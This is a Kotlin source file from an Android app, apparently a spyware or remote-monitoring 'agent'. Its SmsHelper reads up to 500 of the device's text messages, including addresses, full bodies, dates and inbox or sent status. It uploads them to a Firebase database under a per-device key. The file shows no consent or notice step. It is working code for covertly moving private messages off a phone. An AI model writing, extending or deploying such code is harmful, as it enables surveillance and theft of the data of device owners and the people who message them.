package com.guard.agent.helpers.data

import android.content.Context
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger

object SmsHelper {

    private const val TAG = "SmsHelper"
    private const val MAX_SMS = 500

    fun push(ctx: Context, deviceKey: String) {
        try {
            val list = mutableListOf<Map<String, Any>>()
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type", "read"),
                null, null,
                "date DESC"
            )

            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val typeIdx = it.getColumnIndex("type")
                val readIdx = it.getColumnIndex("read")

                while (it.moveToNext() && list.size < MAX_SMS) {
                    val address = it.getString(addrIdx) ?: continue
                    val body = it.getString(bodyIdx) ?: ""
                    val date = it.getLong(dateIdx)
                    val type = it.getInt(typeIdx)
                    val read = it.getInt(readIdx)

                    val typeStr = when (type) {
                        1 -> "inbox"
                        2 -> "sent"
                        3 -> "draft"
                        4 -> "outbox"
                        else -> "unknown"
                    }

                    list.add(
                        mapOf(
                            "address" to address,
                            "body" to body,
                            "date" to date,
                            "type" to typeStr,
                            "read" to (read == 1)
                        )
                    )
                }
            }

            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_SMS)
                .setValue(
                    mapOf(
                        "count" to list.size,
                        "list" to list,
                        "time" to System.currentTimeMillis()
                    )
                )

            Logger.d(TAG, "Pushed ${list.size} SMS")
        } catch (e: Exception) {
            Logger.e(TAG, "push failed", e)
        }
    }
}
